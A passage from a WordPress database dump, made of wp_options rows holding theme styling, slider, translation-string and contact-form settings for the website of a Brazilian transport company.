0\";s:31:\"wm-design-content-bg-img-repeat\";s:9:\"no-repeat\";s:35:\"wm-design-content-bg-img-attachment\";s:6:\"scroll\";s:23:\"wm-design-content-sub-3\";s:0:\"\";s:28:\"wm-design-content-bg-pattern\";s:0:\"\";s:34:\"wm-design-abovefooter-bg-container\";s:0:\"\";s:27:\"wm-design-abovefooter-sub-1\";s:0:\"\";s:30:\"wm-design-abovefooter-bg-color\";s:0:\"\";s:27:\"wm-design-abovefooter-color\";s:0:\"\";s:31:\"wm-design-abovefooter-alt-color\";s:0:\"\";s:32:\"wm-design-abovefooter-link-color\";s:0:\"\";s:34:\"wm-design-abovefooter-border-color\";s:0:\"\";s:27:\"wm-design-abovefooter-icons\";s:0:\"\";s:27:\"wm-design-abovefooter-sub-2\";s:0:\"\";s:32:\"wm-design-abovefooter-bg-img-url\";s:0:\"\";s:37:\"wm-design-abovefooter-bg-img-position\";s:5:\"50% 0\";s:35:\"wm-design-abovefooter-bg-img-repeat\";s:9:\"no-repeat\";s:39:\"wm-design-abovefooter-bg-img-attachment\";s:6:\"scroll\";s:27:\"wm-design-abovefooter-sub-3\";s:0:\"\";s:32:\"wm-design-abovefooter-bg-pattern\";s:0:\"\";s:34:\"wm-design-breadcrumbs-bg-container\";s:0:\"\";s:27:\"wm-design-breadcrumbs-sub-1\";s:0:\"\";s:30:\"wm-design-breadcrumbs-bg-color\";s:0:\"\";s:27:\"wm-design-breadcrumbs-color\";s:0:\"\";s:32:\"wm-design-breadcrumbs-link-color\";s:0:\"\";s:34:\"wm-design-breadcrumbs-border-color\";s:0:\"\";s:27:\"wm-design-breadcrumbs-icons\";s:12:\" light-icons\";s:27:\"wm-design-breadcrumbs-sub-2\";s:0:\"\";s:32:\"wm-design-breadcrumbs-bg-img-url\";s:0:\"\";s:37:\"wm-design-breadcrumbs-bg-img-position\";s:5:\"50% 0\";s:35:\"wm-design-breadcrumbs-bg-img-repeat\";s:9:\"no-repeat\";s:39:\"wm-design-breadcrumbs-bg-img-attachment\";s:6:\"scroll\";s:27:\"wm-design-breadcrumbs-sub-3\";s:0:\"\";s:32:\"wm-design-breadcrumbs-bg-pattern\";s:0:\"\";s:29:\"wm-design-footer-bg-container\";s:0:\"\";s:22:\"wm-design-footer-sub-1\";s:0:\"\";s:25:\"wm-design-footer-bg-color\";s:0:\"\";s:22:\"wm-design-footer-color\";s:0:\"\";s:26:\"wm-design-footer-alt-color\";s:0:\"\";s:27:\"wm-design-footer-link-color\";s:0:\"\";s:29:\"wm-design-footer-border-color\";s:0:\"\";s:22:\"wm-design-footer-icons\";s:12:\" light-icons\";s:22:\"wm-design-footer-sub-2\";s:0:\"\";s:27:\"wm-design-footer-bg-img-url\";s:0:\"\";s:32:\"wm-design-footer-bg-img-position\";s:5:\"50% 0\";s:30:\"wm-design-footer-bg-img-repeat\";s:9:\"no-repeat\";s:34:\"wm-design-footer-bg-img-attachment\";s:6:\"scroll\";s:22:\"wm-design-footer-sub-3\";s:0:\"\";s:27:\"wm-design-footer-bg-pattern\";s:0:\"\";s:29:\"wm-design-bottom-bg-container\";s:0:\"\";s:22:\"wm-design-bottom-sub-1\";s:0:\"\";s:25:\"wm-design-bottom-bg-color\";s:0:\"\";s:22:\"wm-design-bottom-color\";s:0:\"\";s:27:\"wm-design-bottom-link-color\";s:0:\"\";s:29:\"wm-design-bottom-border-color\";s:0:\"\";s:22:\"wm-design-bottom-icons\";s:0:\"\";s:22:\"wm-design-bottom-sub-2\";s:0:\"\";s:27:\"wm-design-bottom-bg-img-url\";s:0:\"\";s:32:\"wm-design-bottom-bg-img-position\";s:5:\"50% 0\";s:30:\"wm-design-bottom-bg-img-repeat\";s:9:\"no-repeat\";s:34:\"wm-design-bottom-bg-img-attachment\";s:6:\"scroll\";s:22:\"wm-design-bottom-sub-3\";s:0:\"\";s:27:\"wm-design-bottom-bg-pattern\";s:0:\"\";s:31:\"wm-design-mainwrap-bg-container\";s:0:\"\";s:24:\"wm-design-mainwrap-sub-1\";s:0:\"\";s:27:\"wm-design-mainwrap-bg-color\";s:0:\"\";s:24:\"wm-design-mainwrap-sub-2\";s:0:\"\";s:29:\"wm-design-mainwrap-bg-img-url\";s:0:\"\";s:34:\"wm-design-mainwrap-bg-img-position\";s:5:\"50% 0\";s:32:\"wm-design-mainwrap-bg-img-repeat\";s:9:\"no-repeat\";s:36:\"wm-design-mainwrap-bg-img-attachment\";s:6:\"scroll\";s:24:\"wm-design-mainwrap-sub-3\";s:0:\"\";s:29:\"wm-design-mainwrap-bg-pattern\";s:0:\"\";s:27:\"wm-design-html-bg-container\";s:0:\"\";s:20:\"wm-design-html-sub-1\";s:0:\"\";s:23:\"wm-design-html-bg-color\";s:0:\"\";s:20:\"wm-design-html-sub-2\";s:0:\"\";s:25:\"wm-design-html-bg-img-url\";s:0:\"\";s:30:\"wm-design-html-bg-img-position\";s:5:\"50% 0\";s:28:\"wm-design-html-bg-img-repeat\";s:9:\"no-repeat\";s:32:\"wm-design-html-bg-img-attachment\";s:6:\"scroll\";s:25:\"wm-design-body-bg-img-url\";s:0:\"\";s:30:\"wm-design-body-bg-img-position\";s:5:\"50% 0\";s:28:\"wm-design-body-bg-img-repeat\";s:9:\"no-repeat\";s:32:\"wm-design-body-bg-img-attachment\";s:6:\"scroll\";s:20:\"wm-design-html-sub-3\";s:0:\"\";s:25:\"wm-design-html-bg-pattern\";s:0:\"\";s:25:\"wm-design-body-bg-pattern\";s:0:\"\";s:21:\"wm-design-font-custom\";s:133:\"<link href=\'http://fonts.googleapis.com/css?family=Ubuntu+Mono|Ubuntu:300,400,700|Ubuntu+Condensed\' rel=\'stylesheet\' type=\'text/css\'>\";s:22:\"wm-design-font-primary\";s:54:\"Ubuntu, Tahoma, Helvetica, Arial, FreeSans, sans-serif\";s:24:\"wm-design-font-secondary\";s:66:\"\'Ubuntu Condensed\', Tahoma, Helvetica, Arial, FreeSans, sans-serif\";s:23:\"wm-design-font-terciary\";s:54:\"Ubuntu, Tahoma, Helvetica, Arial, FreeSans, sans-serif\";s:25:\"wm-design-font-body-stack\";s:7:\"primary\";s:24:\"wm-design-font-body-size\";i:14;s:28:\"wm-design-font-heading-stack\";s:9:\"secondary\";s:29:\"wm-design-font-subtitle-stack\";s:8:\"terciary\";s:22:\"wm-design-minimize-css\";s:4:\"true\";s:22:\"wm-design-gzip-cssonly\";s:0:\"\";s:20:\"wm-design-custom-css\";s:0:\"\";s:16:\"wm-seo-metaboxes\";s:0:\"\";s:15:\"wm-seo-indexing\";s:0:\"\";s:15:\"wm-seo-keywords\";s:0:\"\";s:18:\"wm-seo-description\";s:0:\"\";s:27:\"wm-seo-meta-title-separator\";s:1:\"|\";s:20:\"wm-seo-custom-footer\";s:0:\"\";s:16:\"wm-seo-no-logged\";s:0:\"\";s:13:\"wm-p404-title\";s:22:\"Web page was not found\";s:12:\"wm-p404-text\";s:208:\"<h1>Oops</h1>\r\n<h2>The page you are looking for was moved, deleted or does not exist.</h2>\r\n<p>[button color=\"blue\" icon=\"icon-home\" size=\"xl\" url=\"http://araujotrans.com.br\"]Return to homepage[/button]</p>\r\n\";s:13:\"wm-p404-image\";s:70:\"http://araujotrans.com.br/wp-content/themes/clifden/assets/img/404.png\";s:31:\"wm-p404-no-above-footer-widgets\";s:0:\"\";s:23:\"wm-security-login-error\";s:0:\"\";s:22:\"wm-security-wp-version\";s:4:\"true\";s:23:\"wm-security-live-writer\";s:4:\"true\";}', 'yes'),
(189, 'theme_mods_attitude', 'a:2:{i:0;b:0;s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1425711373;s:4:\"data\";a:6:{s:19:\"wp_inactive_widgets\";a:0:{}s:21:\"attitude_left_sidebar\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:22:\"attitude_right_sidebar\";a:0:{}s:30:\"attitude_business_page_sidebar\";N;s:29:\"attitude_contact_page_sidebar\";N;s:23:\"attitude_footer_sidebar\";N;}}}', 'yes'),
(203, 'theme_mods_phoenix-v1_05', 'a:2:{i:0;b:0;s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1425712708;s:4:\"data\";a:8:{s:19:\"wp_inactive_widgets\";a:0:{}s:15:\"custom-sidebar0\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:15:\"custom-sidebar1\";a:0:{}s:15:\"custom-sidebar2\";N;s:15:\"custom-sidebar3\";N;s:15:\"custom-sidebar4\";N;s:15:\"custom-sidebar5\";N;s:15:\"custom-sidebar6\";N;}}}', 'yes'),
(214, 'phn_enable_responsive', 'enable', 'yes'),
(215, 'phn_space_excerpt', 'enable', 'yes'),
(216, 'phn_default_date_format', 'd F Y', 'yes'),
(217, 'phn_default_widget_date_format', 'd F Y', 'yes'),
(218, 'phn_default_post_header', 'Blog Post', 'yes'),
(219, 'phn_default_post_sidebar', 'post-no-sidebar', 'yes'),
(220, 'phn_show_post_tag', 'Yes', 'yes'),
(221, 'phn_show_post_comment_info', 'Yes', 'yes'),
(222, 'phn_show_post_author_info', 'Yes', 'yes'),
(223, 'phn_use_portfolio_as', 'portfolio style', 'yes'),
(224, 'phn_gdl_portfolio_slug', 'portfolio', 'yes'),
(225, 'phn_gdl_related_portfolio', 'Yes', 'yes'),
(226, 'phn_gdl_related_portfolio_size', '1/4', 'yes'),
(227, 'phn_gdl_related_portfolio_num_fetch', '4', 'yes'),
(228, 'phn_gdl_related_portfolio_title', 'Yes', 'yes'),
(229, 'phn_gdl_related_portfolio_tag', 'Yes', 'yes'),
(230, 'phn_search_archive_sidebar', 'no-sidebar', 'yes'),
(231, 'phn_search_archive_num_excerpt', '285', 'yes'),
(232, 'phn_search_archive_full_blog_content', 'No', 'yes'),
(233, 'phn_portfolio_archive_size', '1/4', 'yes'),
(234, 'phn_portfolio_archive_show_title', 'Yes', 'yes'),
(235, 'phn_portfolio_archive_show_tags', 'Yes', 'yes'),
(236, 'phn_create_sidebar', '<sidebar></sidebar>', 'yes'),
(237, 'phn_show_footer', 'enable', 'yes'),
(238, 'phn_footer_style', 'footer-style4', 'yes'),
(239, 'phn_enable_analytics', 'disable', 'yes'),
(240, 'phn_enable_favicon', 'disable', 'yes'),
(241, 'phn_navigation_size', '12', 'yes'),
(242, 'phn_header_title_size', '25', 'yes'),
(243, 'phn_content_size', '13', 'yes'),
(244, 'phn_widget_title_size', '13', 'yes'),
(245, 'phn_h1_size', '30', 'yes'),
(246, 'phn_h2_size', '25', 'yes'),
(247, 'phn_h3_size', '20', 'yes'),
(248, 'phn_h4_size', '18', 'yes'),
(249, 'phn_h5_size', '16', 'yes'),
(250, 'phn_h6_size', '15', 'yes'),
(251, 'phn_header_font', '- Open Sans', 'yes'),
(252, 'phn_navigation_font', '- Open Sans', 'yes'),
(253, 'phn_slider_title_font', '- Open Sans', 'yes'),
(254, 'phn_content_font', '- Open Sans', 'yes'),
(255, 'phn_stunning_text_font', '- Open Sans', 'yes'),
(256, 'phn_upload_font', '<uploadfont></uploadfont>', 'yes'),
(257, 'phn_logo_position', 'Left', 'yes'),
(258, 'phn_logo_top_margin', '48', 'yes'),
(259, 'phn_logo_bottom_margin', '38', 'yes'),
(260, 'phn_logo_right_top_margin', '42', 'yes'),
(261, 'phn_enable_top_search', 'enable', 'yes'),
(262, 'phn_feedback_button_text', 'Feedback', 'yes'),
(263, 'phn_content_shadow_opacity', '0.4', 'yes'),
(264, 'phn_background_style', 'None', 'yes'),
(265, 'phn_background_pattern', '1', 'yes'),
(266, 'phn_icon_type', 'dark', 'yes'),
(267, 'phn_carousel_icon_type', 'light', 'yes'),
(268, 'phn_footer_icon_type', 'dark', 'yes'),
(269, 'phn_facebook_share', 'enable', 'yes'),
(270, 'phn_twitter_share', 'enable', 'yes'),
(271, 'phn_stumble_upon_share', 'enable', 'yes'),
(272, 'phn_my_space_share', 'enable', 'yes'),
(273, 'phn_delicious_share', 'enable', 'yes'),
(274, 'phn_digg_share', 'enable', 'yes'),
(275, 'phn_reddit_share', 'enable', 'yes'),
(276, 'phn_linkedin_share', 'enable', 'yes'),
(277, 'phn_google_plus_share', 'enable', 'yes'),
(278, 'phn_pinterest_share', 'enable', 'yes'),
(279, 'phn_show_copyright', 'enable', 'yes'),
(280, 'phn_main_navigation_top_sliding_bar', '#3d3d3d', 'yes'),
(281, 'phn_main_navigation_text', '#7a7a7a', 'yes'),
(282, 'phn_main_navigation_text_hover', '#545454', 'yes'),
(283, 'phn_main_navigation_text_current', '#545454', 'yes'),
(284, 'phn_navigation_bottom_bar', '#f0f0f0', 'yes'),
(285, 'phn_navigation_bottom_bar_border', '#e7e7e7', 'yes'),
(286, 'phn_sub_navigation_background', '#fdfdfd', 'yes'),
(287, 'phn_sub_navigation_border', '#ececec', 'yes'),
(288, 'phn_sub_navigation_text', '#7a7a7a', 'yes'),
(289, 'phn_sub_navigation_text_hover', '#3d3d3d', 'yes'),
(290, 'phn_sub_navigation_text_current', '#3d3d3d', 'yes'),
(291, 'phn_search_text', '#878787', 'yes'),
(292, 'phn_search_background', '#ffffff', 'yes'),
(293, 'phn_search_submit_text', '#ffffff', 'yes'),
(294, 'phn_search_submit_background', '#4d4d4d', 'yes'),
(295, 'phn_search_wrapper_background', '#f0f0f0', 'yes'),
(296, 'phn_body_background', '#ff0000', 'yes'),
(297, 'phn_container_background', '#ffffff', 'yes'),
(298, 'phn_page_header_title_color', '#ffffff', 'yes'),
(299, 'phn_page_header_caption_color', '#ffffff', 'yes'),
(300, 'phn_title_color', '#494949', 'yes'),
(301, 'phn_item_title_bottom_bordr', '#a6a6a6', 'yes'),
(302, 'phn_content_color', '#8a8a8a', 'yes'),
(303, 'phn_link_color', '#ff0000', 'yes'),
(304, 'phn_link_hover_color', '#dd9292', 'yes'),
(305, 'phn_sidebar_title_color', '#494949', 'yes'),
(306, 'phn_sidebar_info_color', '#b0b0b0', 'yes');
INSERT INTO `wp_options` (`option_id`, `option_name`, `option_value`, `autoload`) VALUES
(307, 'phn_tagcloud_background', '#f5f5f5', 'yes'),
(308, 'phn_selection_text_clor', '#ffffff', 'yes'),
(309, 'phn_selection_background', '#ff0000', 'yes'),
(310, 'phn_footer_link_color', '#ff0000', 'yes'),
(311, 'phn_footer_link_hover_color', '#d17575', 'yes'),
(312, 'phn_footer_title_color', '#3d3d3d', 'yes'),
(313, 'phn_footer_content_color', '#7a7a7a', 'yes'),
(314, 'phn_footer_content_info_color', '#b1b1b1', 'yes'),
(315, 'phn_footer_background', '#f9f9f9', 'yes'),
(316, 'phn_footer_top_bar', '#f2f2f2', 'yes'),
(317, 'phn_footer_top_bar_border', '#e7e7e7', 'yes'),
(318, 'phn_footer_divider_color', '#dedede', 'yes'),
(319, 'phn_footer_input_text', '#888888', 'yes'),
(320, 'phn_footer_input_background', '#ffffff', 'yes'),
(321, 'phn_footer_input_border', '#d9d9d9', 'yes'),
(322, 'phn_footer_button_text', '#ffffff', 'yes'),
(323, 'phn_footer_button_color', '#7d7d7d', 'yes'),
(324, 'phn_footer_personnal_widget_info', '#ffffff', 'yes'),
(325, 'phn_footer_tagcloud_background', '#ffffff', 'yes'),
(326, 'phn_slider_title_color', '#ffffff', 'yes'),
(327, 'phn_slider_title_background', '#ff0000', 'yes'),
(328, 'phn_slider_caption_color', '#858585', 'yes'),
(329, 'phn_slider_caption_background', '#ffffff', 'yes'),
(330, 'phn_slider_thumbnail_background', '#000000', 'yes'),
(331, 'phn_stunning_text_title_color', '#333333', 'yes'),
(332, 'phn_stunning_text_caption_color', '#666666', 'yes'),
(333, 'phn_stunning_text_button_text', '#ffffff', 'yes'),
(334, 'phn_stunning_text_button_background', '#ff0000', 'yes'),
(335, 'phn_stunning_text_background_color', '#ffffff', 'yes'),
(336, 'phn_port_item_border_color', '#ff0000', 'yes'),
(337, 'phn_port_title_color', '#252525', 'yes'),
(338, 'phn_port_title_hover_color', '#ff0000', 'yes'),
(339, 'phn_port_tag_color', '#838383', 'yes'),
(340, 'phn_port_info_color', '#7a7a7a', 'yes'),
(341, 'phn_port_info_head_color', '#404040', 'yes'),
(342, 'phn_port_filter_color', '#9b9b9b', 'yes'),
(343, 'phn_port_filter_current_color', '#ff0000', 'yes'),
(344, 'phn_post_title_color', '#3b3b3b', 'yes'),
(345, 'phn_post_title_hover_color', '#ff6b6b', 'yes'),
(346, 'phn_post_date_background', '#f5f5f5', 'yes'),
(347, 'phn_post_date_text', '#303030', 'yes'),
(348, 'phn_post_month_text', '#727272', 'yes'),
(349, 'phn_post_year_text', '#ffffff', 'yes'),
(350, 'phn_post_year_background', '#ff0000', 'yes'),
(351, 'phn_post_grid_info_color', '#b5b5b5', 'yes'),
(352, 'phn_post_info_color', '#666666', 'yes'),
(353, 'phn_post_about_author_color', '#f5f5f5', 'yes'),
(354, 'phn_pagination_background', '#f3f3f3', 'yes'),
(355, 'phn_pagination_text', '#7b7b7b', 'yes'),
(356, 'phn_pagination_hover_background', '#ff0000', 'yes'),
(357, 'phn_pagination_hover_text', '#ffffff', 'yes'),
(358, 'phn_pagination_current_background', '#ff0000', 'yes'),
(359, 'phn_pagination_current_text', '#ffffff', 'yes'),
(360, 'phn_contact_form_background_color', '#ffffff', 'yes'),
(361, 'phn_contact_form_text_color', '#888888', 'yes'),
(362, 'phn_contact_form_border_color', '#e0e0e0', 'yes'),
(363, 'phn_contact_form_frame_color', '#f7f7f7', 'yes'),
(364, 'phn_contact_form_inner_shadow', '#ececec', 'yes'),
(365, 'phn_price_title_background', '#ff0000', 'yes'),
(366, 'phn_price_title_text', '#ffffff', 'yes'),
(367, 'phn_price_title_border', '#ffffff', 'yes'),
(368, 'phn_price_tag_color', '#353535', 'yes'),
(369, 'phn_price_content_color', '#868686', 'yes'),
(370, 'phn_price_content_border', '#dedede', 'yes'),
(371, 'phn_price_content_background', '#f7f7f7', 'yes'),
(372, 'phn_personnal_background', '#f7f7f7', 'yes'),
(373, 'phn_personnal_position_text', '#ffffff', 'yes'),
(374, 'phn_personnal_position_background', '#262626', 'yes'),
(375, 'phn_personnal_title', '#404040', 'yes'),
(376, 'phn_personnal_content', '#373737', 'yes'),
(377, 'phn_personnal_widget_info', '#4a4a4a', 'yes'),
(378, 'phn_accordion_text', '#a4a4a4', 'yes'),
(379, 'phn_accordion_title', '#595959', 'yes'),
(380, 'phn_accordion_background', '#f5f5f5', 'yes'),
(381, 'phn_blockquote_color', '#ababab', 'yes'),
(382, 'phn_blockquote_border', '#cfcfcf', 'yes'),
(383, 'phn_button_background_color', '#5c5c5c', 'yes'),
(384, 'phn_button_text_color', '#ffffff', 'yes'),
(385, 'phn_column_service_title_color', '#3b3b3b', 'yes'),
(386, 'phn_column_service_caption_color', '#8A8A8A', 'yes'),
(387, 'phn_divider_line', '#ececec', 'yes'),
(388, 'phn_back_to_top_text_color', '#919191', 'yes'),
(389, 'phn_feedback_color', '#ffffff', 'yes'),
(390, 'phn_feedback_background', '#414141', 'yes'),
(391, 'phn_table_border', '#e5e5e5', 'yes'),
(392, 'phn_table_text_title', '#666666', 'yes'),
(393, 'phn_table_title_background', '#fdfdfd', 'yes'),
(394, 'phn_tab_background_color', '#ffffff', 'yes'),
(395, 'phn_tab_text_color', '#969696', 'yes'),
(396, 'phn_tab_title_text', '#a2a2a2', 'yes'),
(397, 'phn_tab_title_background', '#eeeeee', 'yes'),
(398, 'phn_tab_active_text_color', '#656565', 'yes'),
(399, 'phn_testimonial_slide_content', '#b5b5b5', 'yes'),
(400, 'phn_testimonial_slide_info', '#757575', 'yes'),
(401, 'phn_testimonial_slide_background', '#ffffff', 'yes'),
(402, 'phn_testimonial_static_content_color', '#666666', 'yes'),
(403, 'phn_testimonial_static_border', '#e0e0e0', 'yes'),
(404, 'phn_testimonial_static_info', '#a8a8a8', 'yes'),
(405, 'phn_enable_admin_translator', 'enable', 'yes'),
(406, 'phn_translator_social_shares', 'Social Share', 'yes'),
(407, 'phn_translator_leave_reply', 'Leave a Reply', 'yes'),
(408, 'phn_translator_about_author', 'About the Author', 'yes'),
(409, 'phn_translator_continue_reading', 'Read More →', 'yes'),
(410, 'phn_translator_all', 'All', 'yes'),
(411, 'phn_translator_tag', 'Tags: ', 'yes'),
(412, 'phn_translator_client', 'Client: ', 'yes'),
(413, 'phn_translator_skill', 'Skill: ', 'yes'),
(414, 'phn_translator_visit_website', 'Visit Website: ', 'yes'),
(415, 'phn_translator_related_portfolio', 'Related Portfolio', 'yes'),
(416, 'phn_translator_name_contact_form', 'Name', 'yes'),
(417, 'phn_translator_name_error_contact_form', 'Please enter your name', 'yes'),
(418, 'phn_translator_email_contact_form', 'Email', 'yes'),
(419, 'phn_translator_email_error_contact_form', 'Please enter a valid email address', 'yes'),
(420, 'phn_translator_message_contact_form', 'Message', 'yes'),
(421, 'phn_translator_message_error_contact_form', 'Please enter message', 'yes'),
(422, 'phn_translator_submit_contact_form', 'Submit', 'yes'),
(423, 'phn_translator_contact_send_error', 'Message cannot be sent to destination', 'yes'),
(424, 'phn_translator_contact_send_complete', 'The e-mail was sent successfully', 'yes'),
(425, 'phn_translator_read_more_price', 'Read More', 'yes'),
(426, 'phn_404_title', 'Page Not Found', 'yes'),
(427, 'phn_404_content', 'The page you are looking for doesn\'t seem to exist.', 'yes'),
(428, 'phn_search_header_title', 'Search Results', 'yes'),
(429, 'phn_search_not_found_title', 'Search Not Found.', 'yes'),
(430, 'phn_search_not_found', 'Sorry, but nothing matched your search criteria. Please try again with some different keywords.', 'yes'),
(431, 'phn_nivo_slider_effect', 'sliceDown', 'yes'),
(432, 'phn_nivo_slider_pause_on_hover', 'enable', 'yes'),
(433, 'phn_nivo_slider_show_bullets', 'enable', 'yes'),
(434, 'phn_nivo_slider_show_navigation', 'enable', 'yes'),
(435, 'phn_nivo_slider_hover_navigation', 'enable', 'yes'),
(436, 'phn_nivo_slider_animation_speed', '500', 'yes'),
(437, 'phn_nivo_slider_pause_time', '12000', 'yes'),
(438, 'phn_enable_comment_captcha', 'enable', 'yes'),
(439, 'phn_enable_lightbox_thumbnail', 'enable', 'yes'),
(440, 'phn_enable_lightbox_thumbnail_width', '80', 'yes'),
(441, 'phn_enable_lightbox_thumbnail_height', '45', 'yes'),
(442, 'phn_flex_slider_effect', 'fade', 'yes'),
(443, 'phn_flex_slider_pause_on_hover', 'enable', 'yes'),
(444, 'phn_flex_slider_show_bullets', 'enable', 'yes'),
(445, 'phn_flex_slider_show_navigation', 'enable', 'yes'),
(446, 'phn_flex_slider_animation_speed', '600', 'yes'),
(447, 'phn_flex_slider_pause_time', '12000', 'yes'),
(448, 'phn_flex_slider_pause_on_action', 'disable', 'yes'),
(449, 'phn_flex_thumbnail_width', '75', 'yes'),
(450, 'phn_flex_thumbnail_height', '50', 'yes'),
(451, 'phn_anything_slider_pause_on_hover', 'enable', 'yes'),
(452, 'phn_anything_slider_show_bulltes', 'enable', 'yes'),
(453, 'phn_anything_slider_hover_bulltes', 'disable', 'yes'),
(454, 'phn_anything_slider_show_navigation', 'enable', 'yes'),
(455, 'phn_anything_slider_hover_navigation', 'enable', 'yes'),
(456, 'phn_anything_slider_animation_speed', '600', 'yes'),
(457, 'phn_anything_slider_pause_time', '12000', 'yes'),
(458, 'phn_disable_right_click', 'disable', 'yes'),
(492, 'theme_mods_spacious', 'a:9:{i:0;b:0;s:18:\"nav_menu_locations\";a:2:{s:7:\"primary\";i:2;s:6:\"footer\";i:3;}s:16:\"header_textcolor\";s:6:\"db1111\";s:16:\"background_color\";s:6:\"ef5f00\";s:16:\"background_image\";s:0:\"\";s:17:\"background_repeat\";s:6:\"repeat\";s:21:\"background_position_x\";s:4:\"left\";s:21:\"background_attachment\";s:6:\"scroll\";s:18:\"custom_css_post_id\";i:-1;}', 'yes'),
(493, 'spacious', 'a:40:{s:26:\"spacious_header_logo_image\";s:82:\"http://araujotrans.com.br/wp-content/uploads/2015/03/Logo-Araujo-Transportes-2.png\";s:30:\"spacious_show_header_logo_text\";s:9:\"logo_only\";s:30:\"spacious_header_image_position\";s:5:\"below\";s:20:\"spacious_site_layout\";s:10:\"box_1218px\";s:23:\"spacious_default_layout\";s:27:\"no_sidebar_content_centered\";s:29:\"spacious_pages_default_layout\";s:13:\"right_sidebar\";s:36:\"spacious_single_posts_default_layout\";s:13:\"right_sidebar\";s:29:\"spacious_archive_display_type\";s:11:\"blog_medium\";s:22:\"spacious_primary_color\";s:7:\"#ff0000\";s:19:\"spacious_color_skin\";s:5:\"light\";s:19:\"spacious_custom_css\";s:0:\"\";s:25:\"spacious_activate_favicon\";s:1:\"1\";s:16:\"spacious_favicon\";s:76:\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\";s:24:\"spacious_activate_slider\";s:1:\"1\";s:20:\"spacious_blog_slider\";b:0;s:22:\"spacious_slider_image1\";s:74:\"http://araujotrans.com.br/wp-content/uploads/2015/04/fiorinos-araujo-2.jpg\";s:22:\"spacious_slider_title1\";s:19:\"Araújo Transportes\";s:21:\"spacious_slider_text1\";s:0:\"\";s:28:\"spacious_slider_button_text1\";s:0:\"\";s:21:\"spacious_slider_link1\";s:37:\"http://araujotrans.com.br/quem-somos/\";s:22:\"spacious_slider_image2\";s:72:\"http://araujotrans.com.br/wp-content/uploads/2015/03/1197254_8892943.jpg\";s:22:\"spacious_slider_title2\";s:16:\"Nossos parceiros\";s:21:\"spacious_slider_text2\";s:0:\"\";s:28:\"spacious_slider_button_text2\";s:0:\"\";s:21:\"spacious_slider_link2\";s:36:\"http://araujotrans.com.br/parceiros/\";s:22:\"spacious_slider_image3\";s:79:\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/encomenda-entregue.jpg\";s:22:\"spacious_slider_title3\";s:12:\"Fale conosco\";s:21:\"spacious_slider_text3\";s:0:\"\";s:28:\"spacious_slider_button_text3\";s:0:\"\";s:21:\"spacious_slider_link3\";s:39:\"http://araujotrans.com.br/fale-conosco/\";s:22:\"spacious_slider_image4\";s:60:\"http://araujotrans.com.br/wp-content/uploads/2015/04/HRS.jpg\";s:22:\"spacious_slider_title4\";s:16:\"Nossos serviços\";s:21:\"spacious_slider_text4\";s:0:\"\";s:28:\"spacious_slider_button_text4\";s:0:\"\";s:21:\"spacious_slider_link4\";s:42:\"http://araujotrans.com.br/nossos-servicos/\";s:22:\"spacious_slider_image5\";s:0:\"\";s:22:\"spacious_slider_title5\";s:0:\"\";s:21:\"spacious_slider_text5\";s:0:\"\";s:28:\"spacious_slider_button_text5\";s:10:\"Saiba mais\";s:21:\"spacious_slider_link5\";s:0:\"\";}', 'yes'),
(516, 'nav_menu_options', 'a:2:{i:0;b:0;s:8:\"auto_add\";a:0:{}}', 'yes'),
(651, 'fs_contact_global', 'a:13:{s:12:\"fscf_version\";s:6:\"4.0.52\";s:7:\"donated\";s:5:\"false\";s:20:\"recaptcha_public_key\";s:0:\"\";s:20:\"recaptcha_secret_key\";s:0:\"\";s:18:\"vcita_auto_install\";s:5:\"false\";s:13:\"vcita_dismiss\";s:5:\"false\";s:17:\"vcita_initialized\";s:5:\"false\";s:22:\"vcita_show_disable_msg\";s:5:\"false\";s:10:\"vcita_site\";s:13:\"www.vcita.com\";s:19:\"enable_php_sessions\";s:5:\"false\";s:19:\"num_standard_fields\";s:1:\"4\";s:12:\"max_form_num\";s:1:\"2\";s:9:\"form_list\";a:2:{i:1;s:12:\"Fale Conosco\";i:2;s:8:\"New Form\";}}', 'yes'),
(652, 'wtt_user_permissions', 'administrator', 'yes'),
(653, 'wpt_can_tweet', 'contributor', 'yes'),
(658, 'fs_contact_form1', 'a:174:{s:9:\"form_name\";s:12:\"Fale Conosco\";s:7:\"welcome\";s:192:\"<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/fale-conosco.png\" style=\"width: 35px; float: left; margin-right: 15px;\" /><strong>Informações, duvidas e comentários!</strong>\";s:15:\"after_form_note\";s:0:\"\";s:8:\"email_to\";s:40:\"Fale Conosco, contato@araujotrans.com.br\";s:17:\"php_mailer_enable\";s:9:\"wordpress\";s:10:\"email_from\";s:27:\"no-reply@araujotrans.com.br\";s:19:\"email_from_enforced\";s:4:\"true\";s:14:\"email_reply_to\";s:26:\"contato@araujotrans.com.br\";s:9:\"email_bcc\";s:0:\"\";s:13:\"email_subject\";s:13:\"Fale conosco:\";s:18:\"email_subject_list\";s:0:\"\";s:11:\"name_format\";s:4:\"name\";s:21:\"preserve_space_enable\";s:5:\"false\";s:12:\"double_email\";s:5:\"false\";s:16:\"name_case_enable\";s:5:\"false\";s:18:\"sender_info_enable\";s:4:\"true\";s:14:\"domain_protect\";s:4:\"true\";s:20:\"domain_protect_names\";s:0:\"\";s:13:\"anchor_enable\";s:4:\"true\";s:15:\"email_check_dns\";s:5:\"false\";s:16:\"email_check_easy\";s:5:\"false\";s:10:\"email_html\";s:5:\"false\";s:18:\"email_inline_label\";s:5:\"false\";s:16:\"email_hide_empty\";s:5:\"false\";s:17:\"print_form_enable\";s:5:\"false\";s:22:\"email_keep_attachments\";s:5:\"false\";s:15:\"akismet_disable\";s:5:\"false\";s:19:\"akismet_send_anyway\";s:4:\"true\";s:14:\"captcha_enable\";s:5:\"false\";s:13:\"captcha_small\";s:5:\"false\";s:12:\"captcha_perm\";s:5:\"false\";s:18:\"captcha_perm_level\";s:4:\"read\";s:16:\"recaptcha_enable\";s:5:\"false\";s:14:\"recaptcha_dark\";s:5:\"false\";s:15:\"honeypot_enable\";s:5:\"false\";s:15:\"redirect_enable\";s:4:\"true\";s